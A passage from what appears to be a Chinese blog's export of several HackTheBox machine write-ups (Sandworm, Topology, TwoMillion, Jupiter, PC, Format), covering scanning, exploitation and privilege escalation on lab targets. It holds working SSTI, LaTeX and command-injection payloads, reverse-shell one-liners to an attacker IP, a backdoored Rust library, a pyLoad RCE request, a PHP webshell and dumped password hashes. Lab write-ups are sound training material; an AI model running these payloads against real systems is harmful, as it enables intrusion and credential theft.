latency).Not shown: 995 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://ssa.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA| Not valid before: 2023-05-04T18:03:25|_Not valid after: 2050-09-19T18:03:25|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Secret Spy Agency | Secret Security Service1096/tcp filtered cnrprotocol9207/tcp filtered wap-vcal-sService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 49.02 seconds 80/443需要加hosts： 110.10.11.218 ssa.htb flask做的某安全公司官网： PGPcontact那里需要提交pgp加密的信息： 根据提示点进guide，里面是一些gpg功能，加解密，验证签名之类的: Vertify Signature后面操作生成一个新的密钥对吧，因为涉及到一些属性修改，避免影响主密钥的功能： GPG入门教程 - 阮一峰的网络日志https://www.ruanyifeng.com/blog/2013/07/gpg.html 1234gpg --quick-gen-key miaogpg --armor --export miao &gt; pubkey.ascecho 'miao' | gpg --clearsign 使用公钥和签名信息测试验证签名功能，发现输出信息中包含我们密钥设置的一些属性： SSTI修改gpg密钥中的属性,根据前面知道是Flask，测试SSTI： Modify the GPG UID name - SoBytehttps://www.sobyte.net/post/2021-12/modify-gpg-uid-name/ 1234567gpg --edit-key miaogpg&gt; adduidReal name: &#123;&#123;7*7&#125;&#125;Email address: miao@miao.comComment:You selected this USER-ID: \"&#123;&#123;7*7&#125;&#125; &lt;miao@miao.com&gt;\" 就是根据文章一步步来，完成后重新进行前面的步骤，验证签名，发现SSTI执行成功： reverse shell然后就是测试各种命令，最终得到atlas shell： PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 12345/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo=&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo= | base64 -d | bash\" ').read() &#125;&#125; 信息firejail简单的枚举发现是在firejail沙箱里： httpidhttpie里面一层层翻，admin.json里得到silentobserver密码： 12silentobserverquietLiketheWind22 user flagsilentobserver用户ssh登录： 信息silentobserver上下文中运行pspy(因为atlas在沙盒里，wget，curl之类的都用不了)，发现root用户定时在atlas用户的上下文中运行和编译在 Rust 中开发的 tipnet 项目: tipnet源码和二进制程序我们都有权限查看，测试运行，发现我们的操作都会记录在日志里： logger查看代码发现使用了一个外部库logger： Extern crates - The Rust Referencehttps://doc.rust-lang.org/reference/items/extern-crates.html 而logger,当前用户有写权限: shell那就可以直接修改logger的代码来执行命令，参考这个,修改后不影响原本功能： rust-backdoors/reverse-shell/src/main.rs at master · LukeDSchenk/rust-backdoors · GitHubhttps://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs 1wget http://10.10.14.16:7777/lib.rs -O lib.rs 修改后等待tipnet执行，得到没有限制的atlas,写公钥方便后续操作： lib.rs12345678910111213141516171819202122232425262728293031323334353637383940414243extern crate chrono;use std::fs::OpenOptions;use std::io::Write;use chrono::prelude::*;use std::process::Command;pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) &#123; let command = \"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1\"; let output = Command::new(\"bash\") .arg(\"-c\") .arg(command) .output() .expect(\"not work\"); if output.status.success() &#123; let stdout = String::from_utf8_lossy(&amp;output.stdout); let stderr = String::from_utf8_lossy(&amp;output.stderr); println!(\"standar output: &#123;&#125;\", stdout); println!(\"error output: &#123;&#125;\", stderr); &#125; else &#123; let stderr = String::from_utf8_lossy(&amp;output.stderr); eprintln!(\"Error: &#123;&#125;\", stderr); &#125; let now = Local::now(); let timestamp = now.format(\"%Y-%m-%d %H:%M:%S\").to_string(); let log_message = format!(\"[&#123;&#125;] - User: &#123;&#125;, Query: &#123;&#125;, Justification: &#123;&#125;\\n\", timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(\"/opt/tipnet/access.log\") &#123; Ok(file) =&gt; file, Err(e) =&gt; &#123; println!(\"Error opening log file: &#123;&#125;\", e); return; &#125; &#125;; if let Err(e) = file.write_all(log_message.as_bytes()) &#123; println!(\"Error writing to log file: &#123;&#125;\", e); &#125;&#125; 提权信息suid firejail,类似之前的Cerberus： Cerberus - HackTheBox | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2023/03/22/Cerberus-HackTheBox/ https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin 123find / -perm -4000 -user root 2&gt;/dev/null/usr/local/bin/firejail 能不能跳过中间步骤直接从silentobserver用户到这里的suid firejail呢，实际上是不行的，silentobserver没有权限执行firejail,而atlas用户在jailer组中可以执行： 提权 &amp; root flag一步步来,还是一样的问题，给的sudo不行，但直接su可以： 123456wget 10.10.14.16:7777/firejoin.py# 第一个终端python3 firejoin.py# 第二个终端firejail --join=13520su - shadow123root:$y$j9T$Pg7Bm6pt5ZGjXKjHtVx1A0$oUzCb1AdkT8LSqDw&#x2F;S8epzo8NulMfPH1siYjXUbZl0B:19395:0:99999:7:::silentobserver:$y$j9T$bCOHQ6BXJpACSRhEUptt50$2gOEbQ08M76nlLu6F5RJX61ufBUDSW67zVfwRdHcsI4:19394:0:99999:7:::atlas:$y$j9T$G9Wo78J1wNdBpflU3JDbb1$A087OjgjVVM7G&#x2F;DrtMLWev77DZfpOQU2iidRClpCJbD:19395:0:99999:7::: 参考资料 GPG入门教程 - 阮一峰的网络日志https://www.ruanyifeng.com/blog/2013/07/gpg.html Modify the GPG UID name - SoBytehttps://www.sobyte.net/post/2021-12/modify-gpg-uid-name/ PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 rust-backdoors/reverse-shell/src/main.rs at master · LukeDSchenk/rust-backdoors · GitHubhttps://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs Cerberus - HackTheBox | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2023/03/22/Cerberus-HackTheBox/ https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Topology - HackTheBox","slug":"Topology-HackTheBox","date":"2023-06-12T08:07:31.000Z","updated":"2023-11-06T01:44:50.940Z","comments":true,"path":"2023/06/12/Topology-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/06/12/Topology-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Topology 10.10.11.217 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.217Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-12 14:12 CSTNmap scan report for 10.10.11.217Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)| 256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)|_ 256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Miskatonic University | Topology Group|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.58 seconds 80直接访问是一个小组主页，邮箱和页面链接得到域名： 子域名扫描得到的域名添加hosts后扫描子域名,得到stats和dev： 12345678910.10.11.217 topology.htbffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://topology.htb/\" -H 'Host: FUZZ.topology.htb' -fs 6767[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 272ms] * FUZZ: stats...[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 7395ms] * FUZZ: dev statsServer 状态： dev需要登录： latex.topology.htb是一个在线latex转换器，输入latex输出png图片： latex injectionlatex自身语法功能强大，可以注入其他命令，例如读文件： PayloadsAllTheThings/LaTeX Injection at master · swisskyrepo/PayloadsAllTheThings · GitHubhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection Formula/CSV/Doc/LaTeX Injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-file 存在一些过滤，生成的图片提示不合法命令，但简单测试发现到这个的时候响应空白： 1\\lstinputlisting&#123;&#x2F;etc&#x2F;passwd&#125; 继续搜索latex语法，发现latex使用$作为分隔符： 【LaTeX应用】常用数学公式和符号 - 知乎https://zhuanlan.zhihu.com/p/464237097 单行文本公式放在$与$之间，或者$$与$$之间，例如 1$ y&#x3D;x^2 $ 所以最终读取文件的payload是： 1$\\lstinputlisting&#123;&#x2F;etc&#x2F;passwd&#125;$ dev htpasswd前面dev那里需要登录，结合是apache，那就可以直接读apache的 .htpassd文件： 1$\\lstinputlisting&#123;&#x2F;var&#x2F;www&#x2F;dev&#x2F;.htpasswd&#125;$ 得到的图片找个OCR提取出文本 1vdaisley : $apr1$1ONUB&#x2F;S2$58eeNVirnRDB5zAIbIxTY0 htpasswd crack然后破解hash，得到vdaisley的密码： 123456$ cat hash.txt$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=md5cryptcalculus20 user flag得到的账号密码ssh登录： 提权信息运行pspy，发现gnuplot: 定时运行对应目录下的任意plt文件，这个目录我们有权限，可以创建要运行的plt文件： 另外gnuplt可以运行shell命令： Shellhttp://www.gnuplot.info/docs_4.2/node327.html 那就可以在自定义plt中执行任意命令 提权 &amp; root flag简单的加suid，等待触发执行： 1echo 'system \"chmod u+s /bin/bash\"' &gt; /opt/gnuplot/miao.plt shadow12root:$6$P153wNg6DwlTSIv0$QFutCIjQWlJM24O6vyD5aoRv7kyvivOykonMDItV8rSqKpznqsmxfK7L51il6V7yF75qHE.Hkv6YLK25TSEle1:19496:0:99999:7:::vdaisley:$6$gRnKXcAaVVjMGjaY$PuuHK2.WUsdjSd&#x2F;0ife.Arm05hBBZSZUNTGBrojnvRS4zrvV3prcBac4nOH0Id.7bArqL7QtqAAICTs0fQ2Al0:19063:0:99999:7::: 参考资料 PayloadsAllTheThings/LaTeX Injection at master · swisskyrepo/PayloadsAllTheThings · GitHubhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection Formula/CSV/Doc/LaTeX Injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-file 【LaTeX应用】常用数学公式和符号 - 知乎https://zhuanlan.zhihu.com/p/464237097 Shellhttp://www.gnuplot.info/docs_4.2/node327.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"TwoMillion - HackTheBox","slug":"TwoMillion-HackTheBox","date":"2023-06-07T06:38:43.000Z","updated":"2023-06-14T06:39:42.777Z","comments":true,"path":"2023/06/07/TwoMillion-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/06/07/TwoMillion-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/TwoMillion 10.10.11.221 端口扫描22和80: 12345678910111213141516$ nmap -sC -sV -Pn 10.10.11.221Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-14 13:34 CSTNmap scan report for 10.10.11.221Host is up (0.100s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx|_http-title: Did not follow redirect to http://2million.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 41.06 seconds 80需要加hosts： 110.10.11.221 2million.htb 类似HTB主站的东西： Old HTB注册和当年老的HTB一样需要邀请码，js源码里找到对应函数直接调用,得到rot13加密的信息： 邀请码rot13解密得到： 1In order to generate the invite code, make a POST request to &#x2F;api&#x2F;v1&#x2F;invite&#x2F;generate 然后直接调用API得到邀请码,还需要一次base64解码： 12345curl -X POST http://2million.htb/api/v1/invite/generate&#123;\"0\":200,\"success\":1,\"data\":&#123;\"code\":\"UDg3T00tN1I4UUQtVzM2WFctSko5RTU=\",\"format\":\"encoded\"&#125;&#125;echo UDg3T00tN1I4UUQtVzM2WFctSko5RTU= | base64 -dP87OM-7R8QD-W36XW-JJ9E5 使用得到的邀请码注册登录，注意到公告提示，数据库正在进行迁移，部分功能不可用： APIaccess生成ovpn功能是可用的，修改api调用，得到所有接口信息： admin update其中存在一个admin update接口，直接调用提示content-type问题： 修改成json后提示缺少参数： 然后就是一步步根据响应添加修改请求，把自己变成管理员： admin/vpn/generate然后就可以调用admin的vpn生成接口,看起来是根据提供的用户名动态生成ovpn文件： 猜测后端生成类似这样,构造注入： 12gen_vpn &#123;useranme&#125; xxxgen_vpn miao; id # xxx reverse shell打到www-data: 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.7 4444 &gt;/tmp/f 信息.env文件里得到账号密码： 123456www-data@2million:~&#x2F;html$ cat .envcat .envDB_HOST&#x3D;127.0.0.1DB_DATABASE&#x3D;htb_prodDB_USERNAME&#x3D;adminDB_PASSWORD&#x3D;SuperDuperPass123 user flag得到的账号密码ssh： 12ssh admin@10.10.11.221SuperDuperPass123 提权信息ssh登录时有提示新邮件,查看邮件提示OverlayFS CVE: xkaneiki/CVE-2023-0386: CVE-2023-0386在ubuntu22.04上的提权https://github.com/xkaneiki/CVE-2023-0386 提权 &amp; root flag按照github的步骤一步步得到root： 12345678910scp ./CVE-2023-0386-main.zip admin@2million.htb:/tmp# targetunzip CVE-2023-0386-main.zipcd CVE-2023-0386-mainmake all# 第一个终端./fuse ./ovlcap/lower ./gc# 第二个终端./exp thank_youthank_you.json的内容，先hex解码得到一个json，按照提示base64解码，xor解密得到一封感谢信： 参考资料 xkaneiki/CVE-2023-0386: CVE-2023-0386在ubuntu22.04上的提权https://github.com/xkaneiki/CVE-2023-0386 HTB: TwoMillion | 0xdf hacks stuffhttps://0xdf.gitlab.io/2023/06/07/htb-twomillion.html HackTheBox - TwoMillion - YouTubehttps://www.youtube.com/watch?v=Exl4P3fsF7U","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Jupiter - HackTheBox","slug":"Jupiter-HackTheBox","date":"2023-06-05T12:54:40.000Z","updated":"2023-10-23T03:09:14.452Z","comments":true,"path":"2023/06/05/Jupiter-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/06/05/Jupiter-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Jupiter 10.10.11.216 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.216Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-05 15:20 CSTNmap scan report for 10.10.11.216Host is up (0.11s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)|_ 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://jupiter.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 42.00 seconds 80需要加hosts： 110.10.11.216 jupiter.htb 一个天文学相关的官网： 子域名扫描子域名扫描发现kiosk: 1234ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://jupiter.htb/\" -H 'Host: FUZZ.jupiter.htb' -fs 178[Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 116ms] * FUZZ: kiosk kiosk同样加hosts后访问,是一个grafana： Grafana直接查看history，发现query请求里直接使用rawSql： 直接修改sql语句，发现是postgresql： postgresql to shellpostgresql可以直接执行操作系统命令： Command Execution with PostgreSQL Copy Command | by Nairuz Abulhul | R3d Buck3T | Mediumhttps://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767 1CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1\\\"' 打到postgres shell： 然后直接写入公钥方便后续操作 信息运行pspy之类会发现/dev/shm/network-simulation.yml文件,并且我们有写入权限： 那就可以修改其中内容来执行其他命令 12cd /dev/shmwget http://10.10.14.3:7777/network-simulation.yml -O network-simulation.yml 例如复制一个bash加suid： 小坑，目标目录是/dev/shm的时候，复制和加suid都成功，执行无效，换成tmp目录就正常了，euid是juno，但还是读不了user,因为user.txt的权限设置 但可以修改定时执行的sh文件： 123/tmp/bash -p/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1 然后juno用户也坑，应该是故意设置的，写公钥后也不能ssh user flag所以只能在juno的reverse shell里读user.txt： 信息juno用户在science组，本地发现开放有8888端口，转发出来访问是一个jupyter，需要token： 1ssh postgres@10.10.11.216 -L 8888:127.0.0.1:8888 直接在对应日志里得到最新的token： 123grep -rie token /opt/solar-flares/logs | sort/opt/solar-flares/logs/jupyter-2023-06-05-09.log: or http://127.0.0.1:8888/?token=0f57278de120afc999f9f46f889c33c58289cdc1b26a6cb9 jovianjupyter可以运行任意Python代码(用不同的端口避免前面juno那个sh文件里的干扰)： 1import os; os.system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.3/4445 0&gt;&amp;1\"'); 得到的是jovian用户，写公钥方便后续操作 提权信息可以sudo运行sattrack文件，这个文件当前用户有写权限可以直接修改： 预期文件权限设置错误导致的非预期，预期是strace发现sattrick从/tmp读取配置，并且有一个默认配置文件，复制过去，修改其中URL来写入本地文件: HackTheBox - Jupiter - YouTubehttps://www.youtube.com/watch?v=HOvVjVw3pww&amp;ab_channel=IppSec 提权 &amp; root flag那就可以直接复制个bash： shadow123root:$y$j9T$IW34JPHywVa4Fs590kLAs1$L2hNBUYic4PnYnxpIGE7HXzv.DaeGC4eLE9KJOU6f77:19482:0:99999:7:::juno:$y$j9T$6lgwfUNA28oEIGEaZqFAE.$jpCxLf9xwuwFgO695XVQql6Ol8zLonhGWeMUb.&#x2F;7zFB:19482:0:99999:7:::jovian:$y$j9T$upCjEbA.hevRmruvd2qhK&#x2F;$l3vTld&#x2F;sG3XJO9&#x2F;aYPjGPsqNiqB3F50CXkheKDax0e6:19423:0:99999:7::: 参考资料 Command Execution with PostgreSQL Copy Command | by Nairuz Abulhul | R3d Buck3T | Mediumhttps://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767 HackTheBox - Jupiter - YouTubehttps://www.youtube.com/watch?v=HOvVjVw3pww&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bookworm - HackTheBox","slug":"Bookworm-HackTheBox","date":"2023-05-29T06:44:42.000Z","updated":"2023-06-05T05:52:36.449Z","comments":true,"path":"2023/05/29/Bookworm-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/05/29/Bookworm-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $6$X.PJezLob******kGwtXL6. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"PC - HackTheBox","slug":"PC-HackTheBox","date":"2023-05-22T09:00:05.000Z","updated":"2023-10-09T00:28:26.899Z","comments":true,"path":"2023/05/22/PC-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/05/22/PC-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/PC 10.10.11.214 端口扫描需要全端口,有个50051： 123456789101112$ nmap -p- -Pn 10.10.11.214Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 16:01 CSTStats: 0:48:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 98.24% done; ETC: 16:50 (0:00:52 remaining)Nmap scan report for 10.10.11.214Host is up (0.093s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh50051/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 2940.26 seconds gRPC 50051搜索可以知道50051是gRPC: GRPC Core: gRPC Server Reflection Tutorialhttps://grpc.github.io/grpc/core/md_doc_server_reflection_tutorial.html 可以直接使用grpcui图形界面进行交互： fullstorydev/grpcui: An interactive web UI for gRPC, along the lines of postmanhttps://github.com/fullstorydev/grpcui 12brew install grpcuigrpcui -plaintext 10.10.11.214:50051 SimpleAppLoginUser直接使用 admin : admin登录，得到一个id和token： 12345&#123; &quot;message&quot;: &quot;Your id is 678.&quot;&#125;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3NTMxNjN9.5ZKS24POhkcG5Cn1zYcGnV4E70CbFH6gcsEflzMDzvU (下面的图是一开始自己注册登录得到的结果，懒得改成admin了) getinfo然后使用得到的id和token调用getinfo： sql注入简单测试发现id处存在注入： 后面就一步步注入获取数据，sqlite数据库： PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHubhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md 123456789101112678 union select sqlite_version()678 union SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'accounts678 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts'CREATE TABLE \"accounts\" (username TEXT UNIQUE,password TEXT)678 union SELECT GROUP_CONCAT(username) from accountsadmin,sau678 union SELECT GROUP_CONCAT(password) from accountsadmin,HereIsYourPassWord1431 user flag得到的sau用户账号密码，ssh登录： 12sauHereIsYourPassWord1431 提权信息简单枚举发现本地8000端口： 转发出来查看，发现是pyLoad： 1ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000 搜索可以发现相关漏洞： Pre-auth RCE vulnerability found in pyloadhttps://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/ bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoadhttps://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad 提权 &amp; root flag最简单的，直接给bash加个suid,注意编码： 123curl -i -s -k -X $'POST' \\ --data-binary $'jk=pyimport%20os;os.system(\\\"chmod%20%2bs%20/bin/bash\\\");f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \\ $'http://127.0.0.1:8000/flash/addcrypted2' shadow12root:$6$DyP1KfBYGKoKi9P1$UiRaoILBpT81btxBn3Hzd5KmsRiijiMcR8J&#x2F;F7ULWYvIMVzicsE3s&#x2F;Yfyd20bypQUJ4utbJMRzYip4HT0s9ri.:19368:0:99999:7:::sau:$6$Gx2uZX1oO0Qx6c3z$DUQFBRdrpJRsMo098RVb&#x2F;o.QDhL.n9aKWRdjNrrn6VU4fnBkuhBOnjPz.Oiua5ZswZMrVn3UwfSje&#x2F;fUWkJYv.:19368:0:99999:7::: 参考资料 GRPC Core: gRPC Server Reflection Tutorialhttps://grpc.github.io/grpc/core/md_doc_server_reflection_tutorial.html fullstorydev/grpcui: An interactive web UI for gRPC, along the lines of postmanhttps://github.com/fullstorydev/grpcui PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHubhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md Pre-auth RCE vulnerability found in pyloadhttps://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/ bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoadhttps://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Format - HackTheBox","slug":"Format-HackTheBox","date":"2023-05-15T10:11:41.000Z","updated":"2023-10-09T00:30:41.102Z","comments":true,"path":"2023/05/15/Format-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/05/15/Format-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Format 10.10.11.213 端口扫描22,80,3000: 123456789101112131415161718192021$ nmap -sC -sV -Pn 10.10.11.213Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 14:40 CSTNmap scan report for 10.10.11.213Host is up (0.10s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 c397ce837d255d5dedb545cdf20b054f (RSA)| 256 b3aa30352b997d20feb6758840a517c1 (ECDSA)|_ 256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Site doesn't have a title (text/html).|_http-server-header: nginx/1.18.03000/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://microblog.htb:3000/|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 113.11 seconds 80直接ip跳转到app，加hosts,资源会加载主域名的，一起加了： 110.10.11.213 app.microblog.htb microblog.htb 是一个Microblog： 3000gitea 1.17.3: giteagitea直接探索可以看到microblog的代码： 查看代码发现edit/index.php是从id参数获取文件名，写入txt参数提供的内容，看起来可以任意写文件，然后把id参数的内容即文件名追加写入到order.txt中： 然后fetchPage是从order.txt中读取每一行作为文件名，读取内容进行输出，所以这里结合前面的，构成LFI： MicroBlog回到blog，注册账号测试创建一个blog，发现是直接分配一个子域名，需要加下hosts： 另外存在自动清理，后续操作要快 LFI测试，验证存在LFI： nginx利用LFI读取nginx配置文件，发现存在配置错误，结合前面的代码里有redis的socket，典型案例： Middleware everywhere and lots of misconfigurations to fix | Detectify Labshttps://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/ 根据文章我们是可以利用这个配置问题去操作redis isPro回到代码，发现pro用户存在uploads目录，而信息是从redis获取的： Pro to webshell所以首先我们去利用nginx的配置问题操作redis，把我们变成pro用户(响应502是正常的，直接回去刷新即可)： 1curl -X \"HSET\" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:miao%20pro%20true%20a/b getshell然后就可以利用任意写文件，写入webshell到uploads目录中： 123id&#x3D;&#x2F;var&#x2F;www&#x2F;microblog&#x2F;miao&#x2F;uploads&#x2F;miao.php&amp;header&#x3D;&lt;%3fphp+echo+shell_exec(&quot;rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|sh+-i+2&gt;%261|nc+10.10.14.13+4444+&gt;&#x2F;tmp&#x2F;f&quot;)%3b%3f&gt;http:&#x2F;&#x2F;miao.microblog.htb&#x2F;uploads&#x2F;miao.php redis然后redis中获取信息,得到cooper密码,(shell问题不能交互执行就echo一次执行一条)： 1234567redis-cli -s /var/run/redis/redis.sockecho \"keys *\" | redis-cli -s /var/run/redis/redis.sockecho \"type cooper.dooper\" | redis-cli -s /var/run/redis/redis.sockecho \"hgetall cooper.dooper\" | 